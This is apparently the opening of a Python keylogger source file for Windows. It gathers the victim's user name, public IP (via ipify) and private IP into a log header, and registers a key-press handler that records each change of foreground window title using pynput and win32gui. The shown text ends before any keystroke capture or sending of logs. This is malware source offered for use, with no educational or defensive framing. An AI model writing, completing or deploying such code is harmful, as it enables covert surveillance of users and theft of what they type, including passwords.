from pynput.keyboard import Key, Listener
import time
import os
import requests
import socket
import win32gui

datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''

delete_file = []


def on_press(key):
    global old_app

    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
    else:
        pass

    if new_app != old_app and new_app != '':
        logged_data.append(f'[{datetime}] ~ {new_app}\n')
        old_app = new_app
    else:
        pass

